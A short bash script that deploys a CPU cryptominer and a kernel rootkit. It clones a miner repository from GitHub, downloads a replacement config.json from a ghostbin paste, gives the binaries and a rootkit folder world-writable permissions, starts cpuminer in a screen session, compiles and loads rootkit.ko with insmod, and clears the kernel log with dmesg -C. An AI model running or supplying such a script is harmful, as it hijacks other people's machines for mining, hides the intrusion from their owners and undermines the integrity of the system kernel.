#!/bin/bash
mv /miner temp1
mkdir /miner
cd /miner
git clone https://github.com/Mzikoa21/Zarrassa.git
cd Zarrassa
rm config.json
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
chmod 777 *
chmod 777 ./binaries/*
chmod 777 ./rootkit/*
ls
screen ./cpuminer.sh
cd rootkit
make
dmesg -C
insmod rootkit.ko
dmesg 
